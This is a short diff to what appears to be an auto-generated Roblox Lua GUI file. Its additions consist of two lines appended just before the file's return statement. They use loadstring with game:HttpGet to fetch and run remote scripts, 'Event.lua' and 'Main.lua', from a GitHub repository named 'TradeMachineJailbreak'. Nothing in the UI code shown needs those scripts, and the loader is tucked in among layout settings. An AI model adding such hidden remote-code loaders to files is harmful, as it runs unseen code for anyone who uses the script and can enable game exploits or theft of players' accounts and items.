@@ -285,6 +285,7 @@ G2L["16"]["Name"] = [[BG]];
 G2L["17"] = Instance.new("UIAspectRatioConstraint", G2L["2"]);
 G2L["17"]["AspectRatio"] = 2.7;
 
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TheF1rstT1me/TradeMachineJailbreak/refs/heads/main/Event.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TheF1rstT1me/TradeMachineJailbreak/refs/heads/main/Main.lua", true))()
 
 return G2L["1"], require;
